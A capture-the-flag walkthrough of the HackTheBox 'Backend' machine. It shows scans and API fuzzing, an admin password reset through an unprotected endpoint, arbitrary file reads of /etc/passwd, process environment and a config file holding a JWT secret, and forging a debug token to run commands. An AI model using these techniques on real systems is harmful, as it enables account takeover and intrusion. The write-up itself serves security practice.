# Hackthebox - Backend - Linux

- [Backend](https://app.hackthebox.com/machines/Backend/)

## Nmap

```
┌──(root💀kali)-[~]
└─# nmap -T5 -sC -sV -O -Pn -p- 10.10.11.161
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-13 15:04 EDT
Nmap scan report for 10.10.11.161
Host is up (0.022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    uvicorn
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     content-type: text/plain; charset=utf-8
|     Connection: close
|     Invalid HTTP request received.
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     date: Fri, 13 May 2022 23:23:02 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"detail":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 200 OK
|     date: Fri, 13 May 2022 23:22:50 GMT
|     server: uvicorn
|     content-length: 29
|     content-type: application/json
|     Connection: close
|     {"msg":"UHC API Version 1.0"}
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     date: Fri, 13 May 2022 23:22:56 GMT
|     server: uvicorn
|     content-length: 31
|     content-type: application/json
|     Connection: close
|_    {"detail":"Method Not Allowed"}
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: uvicorn
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=5/13%Time=627EABB5%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,AD,"HTTP/1\.1\x20200\x20OK\r\ndate:\x20Fri,\x2013\x20May\x202022
SF:\x2023:22:50\x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:\x2029\r\nc
SF:ontent-type:\x20application/json\r\nConnection:\x20close\r\n\r\n{\"msg\
SF:":\"UHC\x20API\x20Version\x201\.0\"}")%r(HTTPOptions,BF,"HTTP/1\.1\x204
SF:05\x20Method\x20Not\x20Allowed\r\ndate:\x20Fri,\x2013\x20May\x202022\x2
SF:023:22:56\x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:\x2031\r\ncont
SF:ent-type:\x20application/json\r\nConnection:\x20close\r\n\r\n{\"detail\
SF:":\"Method\x20Not\x20Allowed\"}")%r(RTSPRequest,76,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(F
SF:ourOhFourRequest,AD,"HTTP/1\.1\x20404\x20Not\x20Found\r\ndate:\x20Fri,\
SF:x2013\x20May\x202022\x2023:23:02\x20GMT\r\nserver:\x20uvicorn\r\nconten
SF:t-length:\x2022\r\ncontent-type:\x20application/json\r\nConnection:\x20
SF:close\r\n\r\n{\"detail\":\"Not\x20Found\"}")%r(GenericLines,76,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20rece
SF:ived\.")%r(DNSVersionBindReqTCP,76,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clos
SF:e\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(DNSStatusRequestT
SF:CP,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20text/plai
SF:n;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20HTTP\x20r
SF:equest\x20received\.")%r(SSLSessionReq,76,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(TerminalSe
SF:rverCookie,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20H
SF:TTP\x20request\x20received\.")%r(TLSSessionReq,76,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConn
SF:ection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.");
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.86 seconds
```

## Port 80

- We get an API endpoint (as expected when seeing the nmap scan)  
![image](https://user-images.githubusercontent.com/96747355/168374938-aa26d199-5c3c-4999-93b1-56d31f8d4c29.png)  

### gobuster

```
┌──(root💀kali)-[~]
└─# gobuster dir -u http://10.10.11.161/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/objects.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.161/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/api/objects.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/13 16:08:04 Starting gobuster in directory enumeration mode
===============================================================
/api                  (Status: 200) [Size: 20]
/docs                 (Status: 401) [Size: 30]
                                              
===============================================================
2022/05/13 16:08:26 Finished
===============================================================
```
- So we have 2 more endpoints including one that will require to be authenticated
- Lets run gobuster again in the api folder
```
┌──(root💀kali)-[~]
└─# gobuster dir -u http://10.10.11.161/api/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/objects.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.161/api/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/api/objects.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/13 16:12:32 Starting gobuster in directory enumeration mode
===============================================================
/v1                   (Status: 200) [Size: 30]
                                              
===============================================================
2022/05/13 16:12:54 Finished
===============================================================
```
- We get the v1 endpoint that discloses 2 other endpoints user and admin:  
![image](https://user-images.githubusercontent.com/96747355/168383039-def58ab7-fdb6-4a3a-b56f-c898dff963da.png)  
- The user gives a 404 and the admin needs authentication
- Let's see if we get user enumeration by adding an id in the end. We do but only for one id:  
![image](https://user-images.githubusercontent.com/96747355/168387311-07c3c7af-cf48-4112-9d10-e2023212816a.png)  
- Let's try to fuzz methods as well
- We can try this with wfuzz and hide 404 and 405 codes like this `wfuzz -X POST -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.11.161/api/v1/user/FUZZ --hc 404,405`
```
┌──(root💀kali)-[~]
└─# wfuzz -X POST -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.11.161/api/v1/user/FUZZ --hc 404,405
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.161/api/v1/user/FUZZ
Total requests: 4702

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
=====================================================================

000001029:   307        0 L      0 W        0 Ch        "cgi-bin/"                                                                                                                                                                  
000002500:   422        0 L      3 W        172 Ch      "login"                                                                                                                                                                     
000003788:   422        0 L      2 W        81 Ch       "signup"                                                                                                                                                                    

Total time: 31.68708
Processed Requests: 4702
Filtered Requests: 4699
Requests/sec.: 148.3885
```
- Let's inspect these further with burp
- Signup  
![image](https://user-images.githubusercontent.com/96747355/168388999-5794983c-83d2-4ecc-9d20-53072a76fef8.png)  
- We also need to modify the content type otherwise we will get errors `Content-Type: application/json`
- Using this strategy after a few tries (the response will give detailed answers on what is missing to forge the request) we are able to add another user  
![image](https://user-images.githubusercontent.com/96747355/168389887-c5704a71-c27d-4ad5-a63b-90b30e25c984.png)  
- Login
- When trying to login with our user using a json content type it does not work
- If we try with the previous content type it works and we get a token bearer  
- ![image](https://user-images.githubusercontent.com/96747355/168392465-c7dc262d-4e5b-455a-8fed-978dd2da0c90.png)  
- If we try to login as admin with password "password" or "admin" it does not work  
![image](https://user-images.githubusercontent.com/96747355/168392662-e9184e16-e883-468d-b3de-c4e3947f6fa5.png)
- However we did get a jwt token with our user so let's check the endpoints that needed authentication we have to put our token this way in the headers `Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUzMTg0MjQ3LCJpYXQiOjE2NTI0OTMwNDcsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiNjZkNzU3N2QtNDBiNy00YTUxLTlkNDctMjA1NjFhZmEyZTM3In0.Qv6kCB4alQHqhXfKv6MfcmFNDfL82cPMs2P9mIJ7fuE`  
![image](https://user-images.githubusercontent.com/96747355/168393347-135c1b6e-270f-4222-b40f-457161248da6.png)
- We see it is showing `/openapi.json` this endpoint so we can try to access to see if we get the swagger. And we do!  
![image](https://user-images.githubusercontent.com/96747355/168393481-095c859b-4607-4db3-8a1e-c7ff3d5252f3.png)  
- Swaggers are way cuter so let's do the same thing live with intercept on instead of using the repeater  
- we request the /docs and modify the intercepted request by adding our token  
![image](https://user-images.githubusercontent.com/96747355/168393757-92ecabd8-815d-4d0f-82c4-efd1fc81f5e8.png)
- It looks good it is making a requestion to openapi.json so lets add our token again  
![image](https://user-images.githubusercontent.com/96747355/168393836-fa92dec4-d264-4a95-99e1-0ea341228fbd.png)  
- And we get the swagger!  
![image](https://user-images.githubusercontent.com/96747355/168393907-c3240456-f93b-47ad-a020-f2fac2970cbe.png)  
- There is a `SecretFlagEndpoint` lets try it out  
![image](https://user-images.githubusercontent.com/96747355/168394009-38b5abdd-6130-4f59-9162-8896ec3383a0.png)  
- We get a flag!!  
![image](https://user-images.githubusercontent.com/96747355/168394063-dc98a8d0-9f33-4283-8aea-99cf217b2337.png)
- There is also an update pass function let's check it out and try it on the admin which has id 1 so we can take its guid from the user/1 endpoint we found at the beginning. It is worth trying^^    
![image](https://user-images.githubusercontent.com/96747355/168395032-136a74ef-a343-4643-8409-768ef5cde59d.png)  
- OMG!!! It worked  
![image](https://user-images.githubusercontent.com/96747355/168395074-24fb0f80-cb94-4773-a772-6efb79657209.png)  
- Let's try to login as admin
![image](https://user-images.githubusercontent.com/96747355/168395465-7f8de44c-5223-4667-bca7-ee7f546b0b15.png)  
- It works!  
![image](https://user-images.githubusercontent.com/96747355/168395506-5acd9406-c327-4b79-b291-1d1ad8a3ae01.png)
- So we have an admin token bearer
- As an admin we really can do interesting things like getting file and running commands!! Let's try an ls  
![image](https://user-images.githubusercontent.com/96747355/168395765-41602c3a-fec1-48bc-a131-d71e1f92b718.png)  
- We get an error. It seems like we need to get the jwt token so for this we have to fing the secret  
![image](https://user-images.githubusercontent.com/96747355/168396013-12c1ec2b-08a5-4cdf-8d3b-e705a75a8b76.png)  
- However if we try to get a file it works
![image](https://user-images.githubusercontent.com/96747355/168396151-02022922-7949-49b9-87bb-63a607e91d6c.png)  
- According to the passwd we have a user htb, let's keep a note of this info
- Let's play a little with this request in the repeater. Let's try to see /proc/self/environ
```
{"file":"APP_MODULE=app.main:app\u0000PWD=/home/htb/uhc\u0000LOGNAME=htb\u0000PORT=80\u0000HOME=/home/htb\u0000LANG=C.UTF-8\u0000VIRTUAL_ENV=/home/htb/uhc/.venv\u0000INVOCATION_ID=96ded48945ea4eaa88ac04aee2953139\u0000HOST=0.0.0.0\u0000USER=htb\u0000SHLVL=0\u0000PS1=(.venv) \u0000JOURNAL_STREAM=9:18929\u0000PATH=/home/htb/uhc/.venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000OLDPWD=/\u0000"}
```
- The working dir is `/home/htb/uhc` we can try to get the source code using the info from the env file let's try to access `/home/htb/uhc/app/main.py` It works! Let's paste it to a file and analyse it
- If we check the import we can find the config file `from app.core.config import settings`
- Let's get the file in burp `"file": "/home/htb/uhc/app/core/config.py"` We have the JWT secret in it!
```
class Settings(BaseSettings):
    API_V1_STR: str = \"/api/v1\"
    JWT_SECRET: str = \"SuperSecretSigningKey-HTB\"
    ALGORITHM: str = \"HS256\"
```
- For easiest use on the swagger let's connect with the admin creds we created we just have to click on the Authorize green lock on the top right and enter our credentials
- Ok now let's inspect the token in jwt.io
![image](https://user-images.githubusercontent.com/96747355/168400622-d6b5ab1d-a822-4f51-b1ae-0aa2dc2d3f17.png)  
- Let's try to add our secret now that we have it we need to enter it here:  
![image](https://user-images.githubusercontent.com/96747355/168400796-344237a4-9446-4870-b402-0129ef4d62d9.png)  
- And according to the error message we have we also need to add a debug flag in it so our payload data looks like this  
![image](https://user-images.githubusercontent.com/96747355/168401019-d8897ff1-0180-405c-bc22-cbfbb9c59a5f.png)  
- Now we just need to copy the new token and we should be able to execute commands.
- Let's try our ls again. And it works!
![image](https://user-images.githubusercontent.com/96747355/168401140-a62a8608-2bae-453e-9c06-991a023b37ef.png)  


